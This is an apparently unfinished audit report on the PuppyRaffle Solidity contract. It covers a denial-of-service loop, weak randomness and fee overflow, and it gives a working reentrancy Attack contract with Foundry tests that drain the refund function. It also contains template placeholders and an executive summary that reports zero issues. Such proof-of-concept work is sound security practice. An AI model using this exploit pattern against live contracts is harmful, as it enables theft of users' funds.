---
title: Puppy Raffle Audit Report
author: CryptoBog_xyz
date: March 5, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Puppy Raffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape CryptoBog_xyz\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [CryptoBog_xyz](https://cyfrin.io)
Lead Auditors: 
- CryptoBog_xyz

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
    - [\[S-#\] Title (ROOT CAUSE + IMPACT)](#s--title-root-cause--impact)
    - [\[H-#\] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.](#h--the-reset-of-the-puppyraffleplayersplayerindex-array-happens-after-the-external-call-puppyrafflesendvalue-which-leads-to-a-reentancy-situation)
    - [\[S-#\] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"](#s--the-randomness-generator-in-the-puppyraffleselectwinner-is-not-really-random-and-can-be-influenced-which-breaks-one-of-the-main-functioalities-of-the-protocol-4-every-x-seconds-the-raffle-will-be-able-to-draw-a-winner-and-be-minted-a-random-puppy)
    - [\[S-#\] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol](#s--puppyrafflefee-is-uint64-and-can-be-overflown-breaking-the-arithmetics-of-the-protocol)
    - [\[S-#\] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.](#s--unsafe-casting-of-uint256-to-uint64-would-lead-to-loss-of-fee-funds-if-fee-is-higher-than-typeuint64max-which-is-approximately-1845-ether)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

Protocol does X, Y, Z

# Disclaimer

CryptoBog_xyz makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 
## Scope 
- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
- In Scope:

```
./src/
-- PuppyRaffle.sol
```

- Solc Version: 0.7.6
- Chain(s) to deploy contract to: Ethereum

| file                | files | blank | comment | code |
| ------------------- | ----- | ----- | ------- | ---- |
| src/PuppyRaffle.sol | 1     | 30    | 43      | 143  |

## Roles
Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.


# Executive Summary
## Issues found
| Severity      | Number of Issues |
| ------------- | ---------------- |
| High          | 0                |
| Medium        | 0                |
| Low           | 0                |
| Informational | 0                |
| Total         | 0                |

# Findings
# High

### [S-#] Title (ROOT CAUSE + IMPACT)

**Description:** Function `PuppyRaffle.sol::enterRaffle()` has a for-loop which checks for duplicate players and reverts if finds any. 
The problem arises when the `PuppyRaffle.sol::players` array gets big and this could lead to a denial of service (i.e. the function `PuppyRaffle.sol::enterRaffle()` becomes unfinishable).

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); 
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) { 
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```

**Impact:** Denial of Service could lead to the main functionality ("This project is to enter a raffle to win a cute dog NFT.") of the contract being inaccessible. 

**Proof of Concept:** 
In the test suite add the following test which proves that the gas cost of entering the raffle increases with the number of players taking part. 

```solidity
function testDoSAttack() public {
        uint64 numPlayers = 100; // Set the number of players
        address[] memory players = new address[](numPlayers); // Initialize an array for the players
        for (uint128 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i)); // Generate unique addresses
        }
        uint256 gasStartFirst = gasleft(); // Record gas before the transaction
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players); // Enter the raffle with the first group of players
        uint256 gasEndFirst = gasleft(); // Record gas after the transaction
        uint256 gasCostFirst = gasStartFirst - gasEndFirst; // Calculate the gas cost of the transaction
        console.log(gasCostFirst); // Log the gas cost

        address[] memory playersTwo = new address[](numPlayers); // Initialize a second array for the players
        for (uint128 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(uint160(i + numPlayers)); // Generate unique addresses for the second group
        }
        uint256 gasStartSecond = gasleft(); // Record gas before the second transaction
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo); // Enter the raffle with the second group of players
        uint256 gasEndSecond = gasleft(); // Record gas after the second transaction
        uint256 gasCostSecond = gasStartSecond - gasEndSecond; // Calculate the gas cost of the second transaction
        console.log(gasCostSecond); // Log the gas cost of the second transaction

        assert(gasCostSecond > gasCostFirst); // Assert that the gas cost for the second transaction is higher
    }
```

**Recommended Mitigation:** 

<hr>

### [H-#] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.

**Description:** In the function `PuppyRaffle::refund()` the array which stores the active users (i.e. those who have not yet refunded their `PuppyRaffle::entranceFee`) is updated after the external call `PuppyRaffle::sendValue()`. In that case a user might implement a malicious contract that would reenter the `PuppyRaffle::refund()` after receiving the entrance fee and clear out the contract's balance.

Contract Code: 
```soliditiy
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

**Impact:** That particulat reentrancy attack could result in a complete loss of the funds stored in the `PuppyRaffle` contract. 

**Proof of Concept:** 
1. Create a Contract that will exploit the vulnerability:

```solidity
contract Attack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    } 

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

2. Create a testcase to check whether the aforementioned contract was able to successfully exploit:

The `PuppyRaffleTest.t.sol::testCanReenter()` function tests the PuppyRaffle contract's vulnerability to a reentrancy attack by simulating an attack scenario. It involves creating an attacker contract that exploits the refund function, checking the contract's balances before and after the attack to assess the impact.

```solidity
function testCanReenter() public playerEntered {
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        Attack attackerContract = new Attack(puppyRaffle);
        address attackerUser = makeAddr("attackerUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startAttackerContractBalance = address(attackerContract).balance;
        uint256 startPuppyRaffleContractBalance = address(puppyRaffle).balance;

        vm.prank(attackerUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Attacker Balance start: ", startAttackerContractBalance);
        console.log("PuppyRaffle Balance start: ", startPuppyRaffleContractBalance);
        
        console.log("Attacker Contract balance after attack: ", address(attackerContract).balance);
        console.log("PuppyRaffle Contract balance after attack: ", address(puppyRaffle).balance);
    }
```

**Recommended Mitigation:** To mitigate the reentrancy risk in the `PuppyRaffle::refund()` function, consider the following recommendations:

1. *Update State Before External Calls*: Move the state update (`players[playerIndex] = address(0);`) before the external call (`payable(msg.sender).sendValue(entranceFee);`). This ensures that the contract's state is updated before any external calls are made, reducing the risk of reentrancy.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

2. *Use Reentrancy Guards*: Implement a reentrancy guard, such as the `nonReentrant` modifier from OpenZeppelin's `ReentrancyGuard` contract, to prevent reentrant calls. This modifier can be applied to functions that are susceptible to reentrancy attacks.

3.  *Consider Using Pull Over Push Payments*: Instead of sending funds directly to the user within the `refund` function, consider implementing a system where users can withdraw their funds. This approach can help mitigate reentrancy risks by separating the state update from the external call.

<hr>

### [S-#] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"

**Description:** The `PuppyRaffle::selectWinner()` function's reliance on `msg.sender`, `block.timestamp`, `and block.difficulty` for determining the winner introduces vulnerabilities to manipulation by users or miners. Its external visibility allows any address to potentially influence the outcome, compromising the randomness of the selection process.

```solidity
    function selectWinner() external { 
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); 
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); 
        uint256 winnerIndex =
@ -->       uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee; 
```


**Impact:** The compromised randomness in the `PuppyRaffle::selectWinner()` function undermines the raffle's fairness and integrity, potentially favoring certain participants. This manipulation could lead to a skewed distribution of winners and erode trust in the system, affecting user engagement and the protocol's reputation.

**Proof of Concept:**

**Recommended Mitigation:** To mitigate the vulnerability in the `PuppyRaffle::selectWinner()` function, which relies on `msg.sender`, `block.timestamp`, and `block.difficulty` for determining the winner, you can implement a more secure and unpredictable randomness mechanism. Two popular solutions for generating secure random numbers in smart contracts are Chainlink VRF (Verifiable Random Function) and a Commit-Reveal Scheme. Below are detailed explanations and code examples for both approaches:

Chainlink VRF
Chainlink VRF provides a provably fair and verifiable source of randomness. It uses a combination of cryptographic techniques to ensure that the random number cannot be predicted or manipulated by any party.

Integration with Chainlink VRF: 
1. First, you need to integrate your smart contract with Chainlink VRF. This involves requesting a random number from the Chainlink VRF oracle and using the response to select the winner.
2. Requesting a Random Number: You can request a random number by calling the requestRandomness function provided by the Chainlink VRF contract. This function takes a key hash and a fee as arguments.
3. Using the Random Number: Once the random number is returned by the Chainlink VRF oracle, you can use it to select the winner. The random number is provided as a bytes32 value, which you can convert to a uint256 and use in your selection logic.
For more details on Chainlink VRF, visit the [Chainlink VRF Documentation](https://docs.chain.link/docs/get-a-random-number/).

Commit-Reveal Scheme
A Commit-Reveal Scheme involves participants committing to a secret value (their choice) and then revealing it in a public manner. The reveal phase is designed to be fair and unbiased, ensuring that the outcome is determined by the participants' choices rather than any external factors.

1. Commit Phase: Participants submit their secret choices (e.g., a hash of their choice) to the contract.
2. Reveal Phase: After a certain period, participants reveal their choices. The contract verifies that the revealed choice matches the committed choice and uses these to select the winner.
3. Selection: The winner is determined based on the revealed choices, ensuring that the outcome is fair and unpredictable.

For more information on Commit-Reveal Schemes, you can refer to academic papers and articles on the topic, such as this [paper](https://eprint.iacr.org/2015/1090.pdfk) on the subject.

### [S-#] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol

**Description:** In the `PuppyRaffle::selectWinner()` the fee can be overflown if it rises above the level of max(uint64), which is equal to "18446744073709551615". 

```solidity
    function selectWinner() external { 
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); 
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); 
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee; 
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
@ -->   totalFees = totalFees + uint64(fee)
        ...

```

**Impact:** If the `entranceFee` is set to higher than the value "18446744073709551615", it will wrap around in the `PuppyRaffle::selectWinner()` and start again at "0", which would lead to the loss of fee amount.

**Proof of Concept:**
1. Creata a new test file with the `entranceFee` set higher than the `type(uint64).max`:
```solidity
    contract Audit_Arithmetics_PoCTest is Test {
        PuppyRaffle puppyRaffle;
@-->    uint256 entranceFee = 28446744073709551615;
```

2. Add the following test:
```solidity
    function testArithmetics() public playersEntered{
        console.log("Entrance Fee: ", entranceFee);
        console.log("Number of Players: ", players.length);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);


        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
        uint256 expectedFee = ((entranceFee * 4) * 20 / 100);
        console.log("Expected fee Before: ", expectedFee);
        console.log("Total fee Before: ", puppyRaffle.totalFees());


        puppyRaffle.selectWinner();
        console.log("Real Payout: ", expectedPayout);
        console.log("Real fee After: ", puppyRaffle.totalFees());

        assertEq(puppyRaffle.totalFees(), expectedFee);
    }
```

3. Run the test and check the output:
```bash
        [FAIL. Reason: assertion failed] testArithmetics() (gas: 396996)
        Logs:
        Entrance Fee:  28446744073709551615
        Number of Players:  4
@-->    Expected fee Before:  22757395258967641292
        Total fee Before:  0
        Real Payout:  91029581035870565168
@-->    Real fee After:  4310651185258089676
        Error: a == b not satisfied [uint]
                Left: 4310651185258089676
            Right: 22757395258967641292

        Suite result: FAILED. 0 passed; 1 failed; 0 skipped;
```

The expected amount of totalFees is higher than the real amount.

**Recommended Mitigation:** There are couple of ways to mitigate this problem:
1. Remove the downcasting in the `PuppyRaffle::selectWinner()` function:
```diff
    function selectWinner() external { 
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); 
            require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); 
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 totalAmountCollected = players.length * entranceFee; 
            uint256 prizePool = (totalAmountCollected * 80) / 100;
            uint256 fee = (totalAmountCollected * 20) / 100;
--          totalFees = totalFees + uint64(fee); 
++          totalFees = totalFees + fee;
            uint256 tokenId = totalSupply();
```

2. Use solidity version of higher than 0.8.0, because it has Arithmetic operations checked by default.
```diff
    // SPDX-License-Identifier: MIT
--  pragma solidity ^0.7.6;
++  pragma solidity ^0.8.0;
```


### [S-#] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.

**Description:** The `PuppyRaffle::fee` variable is initially defined as uint256, but then downcasted to uint64. Downcasting leads to concatenation of the variable, which in the case of uint would mean loss of fee funds.

```solidity
    function selectWinner() external { 
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); 
            require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); 
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 totalAmountCollected = players.length * entranceFee; 
            uint256 prizePool = (totalAmountCollected * 80) / 100;
@-->        uint256 fee = (totalAmountCollected * 20) / 100;
@-->        totalFees = totalFees + uint64(fee); 
```

**Impact:** This issue will result in the loss of the fee eligible for the contract.

**Proof of Concept:** Use the following test with 12 players participating in the raffle and the `entranceFee` set to 10 ether:
```solidity
    contract Audit_PoC_Downcasting is Test {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee = 10e18;
        address playerOne = address(1);
        address playerTwo = address(2);
        address playerThree = address(3);
        address playerFour = address(4);
        address playerFive = address(5);
        address playerSix = address(6);
        address playerSeven = address(7);
        address playerEight = address(8);
        address playerNine = address(9);
        address playerTen = address(10);
        address playerEleven = address(11);
        address playerTwelve = address(12);
        address feeAddress = address(99);
        uint256 duration = 1 days;
        address[] players;
```


```solidity
    function testDowncasting() public playersEntered{
        console.log("Entrance Fee: ", entranceFee / 1e18);
        console.log("Number of Players: ", players.length);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);


        uint256 expectedPayout = ((entranceFee * players.length) * 80 / 100);
        uint256 expectedFee = ((entranceFee * players.length) * 20 / 100);
        console.log("Expected fee Before: ", expectedFee / 1e18);
        console.log("Total fee Before: ", puppyRaffle.totalFees());


        puppyRaffle.selectWinner();
        console.log("Real Winner Payout: ", expectedPayout / 1e18);
        console.log("Real fee After: ", puppyRaffle.totalFees() / 1e18);

        assertEq(puppyRaffle.totalFees(), expectedFee);
```
Output:
```bash
    [FAIL. Reason: assertion failed] testDowncasting() (gas: 740408)
    Logs:
    Entrance Fee:  10
    Number of Players:  12
    Expected fee Before:  24
    Total fee Before:  0
    Real Winner Payout:  96
    Real fee After:  5
    Error: a == b not satisfied [uint]
            Left: 5553255926290448384
        Right: 24000000000000000000

    Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.43ms (974.54µs CPU time)

    Ran 1 test suite in 169.99ms (4.43ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

    Failing tests:
    Encountered 1 failing test in test/Audit_PoC_Downcasting.t.sol:Audit_PoC_Downcasting
    [FAIL. Reason: assertion failed] testDowncasting() (gas: 740408)
```

**Recommended Mitigation:** Remove the downcast from the `PuppyRaffle::selectWinner()` function:

```diff
    function selectWinner() external { 
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over"); 
            require(players.length >= 4, "PuppyRaffle: Need at least 4 players"); 
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 totalAmountCollected = players.length * entranceFee; 
            uint256 prizePool = (totalAmountCollected * 80) / 100;
            uint256 fee = (totalAmountCollected * 20) / 100;
--          totalFees = totalFees + uint64(fee); 
++          totalFees = totalFees + fee;
            uint256 tokenId = totalSupply();
```
# Medium
# Low 
# Informational
# Gas 